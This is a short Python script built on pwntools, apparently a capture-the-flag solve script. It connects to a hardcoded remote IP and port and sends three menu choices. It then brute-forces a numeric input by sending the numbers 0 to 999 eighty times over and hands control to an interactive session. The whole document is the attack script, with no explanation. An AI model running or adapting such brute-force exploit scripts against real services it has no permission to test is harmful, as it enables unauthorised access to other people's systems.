from pwn import *

context(arch="i386", os="linux")

r = remote("3.81.92.37", 4242)

r.sendline("c")
r.sendline("n")
r.sendline("p")
for _ in range(0, 80):
    for i in range(0, 1000):
        r.sendline(str(i))
r.interactive()
